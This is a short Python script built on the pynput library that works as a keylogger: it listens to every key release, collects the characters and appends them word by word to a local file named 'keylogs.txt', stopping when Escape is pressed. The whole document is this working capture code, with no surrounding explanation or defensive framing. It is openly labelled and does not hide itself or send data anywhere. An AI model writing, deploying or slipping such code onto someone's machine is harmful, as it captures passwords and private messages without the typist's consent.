import pynput
from pynput.keyboard import Key, Listener


charCount = 0
keys = []


def on_press(key):
	try:
		print("Key pressed ", key)
	except Exception as ex:
		print("Exception happend")


def on_release(key):
	global keys, charCount
	if key == Key.esc:
		print("[!] Stop")
		print(keys)
		return False
	else:
		if key == Key.enter:
			writeToFile(keys)
		elif key == Key.space:
			key = " "
			writeToFile(keys)
			keys = []
			charCount = 0
		keys.append(key)
		charCount += 1

def writeToFile(key):
	with open("keylogs.txt","a") as file:
		for key in keys:
			key = str(key).replace("'","")
			if "key".upper() not in key.upper():
				file.write(key)
		file.write("\n")


print("[*] start listening..")

with Listener(on_press=on_press,on_release=on_release) as listener:
	listener.join()

